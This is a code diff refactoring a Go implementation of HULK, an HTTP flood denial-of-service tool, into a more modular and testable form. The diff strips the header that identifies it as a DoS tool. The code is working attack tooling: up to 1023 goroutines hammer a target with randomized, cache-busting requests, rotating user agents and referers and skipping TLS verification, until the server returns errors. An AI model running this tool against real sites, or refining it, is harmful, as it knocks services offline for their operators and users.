@@ -1,12 +1,5 @@
 package main
 
-/*
- HULK DoS tool on goroutines.
- Completely rewritten for maximum raw TCP throughput.
- Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
- This go program licensed under GPLv3.
-*/
-
 import (
 	"bytes"
 	"context"
@@ -54,7 +47,6 @@ var (
 
 	sentCounters uint64
 	errCounters  uint64
-	cancelFunc   context.CancelFunc
 )
 
 type arrayFlags []string
@@ -69,6 +61,10 @@ func (i *arrayFlags) Set(value string) error {
 }
 
 func main() {
+	os.Exit(run(context.Background(), os.Args[1:], os.Getenv))
+}
+
+func run(ctx context.Context, args []string, getenv func(string) string) int {
 	var (
 		version bool
 		site    string
@@ -77,46 +73,49 @@ func main() {
 		headers arrayFlags
 	)
 
-	flag.BoolVar(&version, "version", false, "print version and exit")
-	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
-	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
-	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file.")
-	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
-	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
-	flag.Parse()
+	fs := flag.NewFlagSet("hulk", flag.ContinueOnError)
+	fs.BoolVar(&version, "version", false, "print version and exit")
+	fs.BoolVar(&safe, "safe", false, "Autoshut after dos.")
+	fs.StringVar(&site, "site", "http://localhost", "Destination site.")
+	fs.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file.")
+	fs.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
+	fs.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
+	if err := fs.Parse(args); err != nil {
+		return 1
+	}
 
 	if version {
 		fmt.Println("Hulk", __version__)
-		os.Exit(0)
+		return 0
 	}
 
 	u, err := url.Parse(site)
 	if err != nil {
 		fmt.Println("err parsing url parameter")
-		os.Exit(1)
+		return 1
 	}
 
-	t := os.Getenv("HULKMAXPROCS")
+	t := getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil || maxproc <= 0 {
 		maxproc = 1023
 	}
 
+	userAgents := headersUseragents
 	if agents != "" {
-		if dataBytes, err := os.ReadFile(agents); err == nil {
-			headersUseragents = []string{}
-			for _, a := range strings.Split(string(dataBytes), "\n") {
-				if strings.TrimSpace(a) != "" {
-					headersUseragents = append(headersUseragents, strings.TrimSpace(a))
-				}
-			}
-		} else {
+		dataBytes, err := os.ReadFile(agents)
+		if err != nil {
 			fmt.Printf("can't load User-Agent list from %s\n", agents)
-			os.Exit(1)
+			return 1
+		}
+		userAgents = []string{}
+		for _, a := range strings.Split(string(dataBytes), "\n") {
+			if strings.TrimSpace(a) != "" {
+				userAgents = append(userAgents, strings.TrimSpace(a))
+			}
 		}
 	}
 
-	// Format custom headers safely
 	var customHeaders []string
 	for _, element := range headers {
 		parts := strings.SplitN(element, ":", 2)
@@ -125,8 +124,8 @@ func main() {
 		}
 	}
 
-	ctx, cancel := context.WithCancel(context.Background())
-	cancelFunc = cancel
+	ctx, cancel := context.WithCancel(ctx)
+	defer cancel()
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
@@ -140,9 +139,8 @@ func main() {
 	fmt.Println("           Go!")
 	fmt.Println("Max procs        |\tResp OK |\tGot err")
 
-	// Pre-spawn all goroutines instantly
 	for i := 0; i < maxproc; i++ {
-		go attack(ctx, u, data, customHeaders, i)
+		go attack(ctx, u, data, customHeaders, userAgents, headersReferers, i, cancel)
 	}
 
 	ticker := time.NewTicker(time.Second)
@@ -158,39 +156,50 @@ runLoop:
 		}
 	}
 
-	// Final status
 	fmt.Printf("\r%-16d |\t%7d |\t%6d\n", maxproc, atomic.LoadUint64(&sentCounters), atomic.LoadUint64(&errCounters))
 	fmt.Println("-- HULK Attack Finished --")
+	return 0
 }
 
-func attack(ctx context.Context, siteURL *url.URL, postData string, customHeaders []string, id int) {
-	// Independent PRNG per goroutine to avoid lock contention
-	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
-
+func resolveAddr(siteURL *url.URL) string {
 	addr := siteURL.Host
-	if !strings.Contains(addr, ":") {
-		if siteURL.Scheme == "https" {
-			addr += ":443"
+	if strings.Contains(addr, ":") {
+		return addr
+	}
+	if siteURL.Scheme == "https" {
+		return addr + ":443"
+	}
+	return addr + ":80"
+}
+
+func extractPathInfo(siteURL *url.URL) (basePath, paramJoiner string) {
+	if siteURL.Path == "" {
+		basePath = "/"
+	} else {
+		basePath = siteURL.Path
+	}
+	if strings.Contains(basePath, "?") || siteURL.RawQuery != "" {
+		paramJoiner = "&"
+	} else {
+		paramJoiner = "?"
+	}
+	if siteURL.RawQuery != "" {
+		if !strings.Contains(basePath, "?") {
+			basePath += "?" + siteURL.RawQuery
 		} else {
-			addr += ":80"
+			basePath += "&" + siteURL.RawQuery
 		}
 	}
+	return
+}
+
+func attack(ctx context.Context, siteURL *url.URL, postData string, customHeaders, userAgents, referers []string, id int, cancel context.CancelFunc) {
+	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
+	addr := resolveAddr(siteURL)
+	basePath, paramJoiner := extractPathInfo(siteURL)
 
 	dialer := &net.Dialer{Timeout: 5 * time.Second}
 	tlsConfig := &tls.Config{InsecureSkipVerify: true}
-
-	basePath := siteURL.Path
-	if basePath == "" {
-		basePath = "/"
-	}
-
-	paramJoiner := "?"
-	if strings.Contains(basePath, "?") || siteURL.RawQuery != "" {
-		paramJoiner = "&"
-	}
-	if siteURL.RawQuery != "" {
-		basePath += "?" + siteURL.RawQuery
-	}
 
 	reqBuf := bytes.NewBuffer(make([]byte, 0, 1024))
 	respBuf := make([]byte, 1024)
@@ -211,7 +220,7 @@ func attack(ctx context.Context, siteURL *url.URL, postData string, customHeader
 
 		if err != nil {
 			atomic.AddUint64(&errCounters, 1)
-			time.Sleep(100 * time.Millisecond) // Don't burn CPU if network is down
+			time.Sleep(100 * time.Millisecond)
 			continue
 		}
 
@@ -222,7 +231,7 @@ func attack(ctx context.Context, siteURL *url.URL, postData string, customHeader
 			}
 
 			reqBuf.Reset()
-			buildRequest(reqBuf, rng, basePath, paramJoiner, siteURL.Host, postData, customHeaders)
+			buildRequest(reqBuf, rng, basePath, paramJoiner, siteURL.Host, postData, customHeaders, userAgents, referers)
 
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			_, err = conn.Write(reqBuf.Bytes())
@@ -240,16 +249,14 @@ func attack(ctx context.Context, siteURL *url.URL, postData string, customHeader
 
 			atomic.AddUint64(&sentCounters, 1)
 
-			respStr := string(respBuf[:n])
-			if safe && (strings.Contains(respStr, "HTTP/1.1 50") || strings.Contains(respStr, "HTTP/1.0 50")) {
-				if cancelFunc != nil {
-					cancelFunc()
+			if safe && detectServerError(string(respBuf[:n])) {
+				if cancel != nil {
+					cancel()
 				}
 				return
 			}
 
-			// If server requested close, reconnect
-			if strings.Contains(strings.ToLower(respStr), "connection: close") {
+			if strings.Contains(strings.ToLower(string(respBuf[:n])), "connection: close") {
 				break
 			}
 		}
@@ -260,12 +267,12 @@ func attack(ctx context.Context, siteURL *url.URL, postData string, customHeader
 func buildblock(rng *rand.Rand, size int) string {
 	buf := make([]byte, size)
 	for i := range buf {
-		buf[i] = byte(rng.Intn(25) + 65) // A-Z
+		buf[i] = byte(rng.Intn(25) + 65)
 	}
 	return string(buf)
 }
 
-func buildRequest(buf *bytes.Buffer, rng *rand.Rand, basePath, paramJoiner, host, postData string, customHeaders []string) {
+func buildRequest(buf *bytes.Buffer, rng *rand.Rand, basePath, paramJoiner, host, postData string, customHeaders, userAgents, referers []string) {
 	if postData == "" {
 		buf.WriteString("GET ")
 		buf.WriteString(basePath)
@@ -283,11 +290,11 @@ func buildRequest(buf *bytes.Buffer, rng *rand.Rand, basePath, paramJoiner, host
 	buf.WriteString("Host: ")
 	buf.WriteString(host)
 	buf.WriteString("\r\nUser-Agent: ")
-	buf.WriteString(headersUseragents[rng.Intn(len(headersUseragents))])
+	buf.WriteString(userAgents[rng.Intn(len(userAgents))])
 	buf.WriteString("\r\nAccept-Charset: ")
 	buf.WriteString(acceptCharset)
 	buf.WriteString("\r\nReferer: ")
-	buf.WriteString(headersReferers[rng.Intn(len(headersReferers))])
+	buf.WriteString(referers[rng.Intn(len(referers))])
 	buf.WriteString(buildblock(rng, rng.Intn(5)+5))
 	buf.WriteString("\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n")
 
@@ -304,4 +311,8 @@ func buildRequest(buf *bytes.Buffer, rng *rand.Rand, basePath, paramJoiner, host
 	} else {
 		buf.WriteString("\r\n")
 	}
+}
+
+func detectServerError(resp string) bool {
+	return strings.Contains(resp, "HTTP/1.1 50") || strings.Contains(resp, "HTTP/1.0 50")
 }
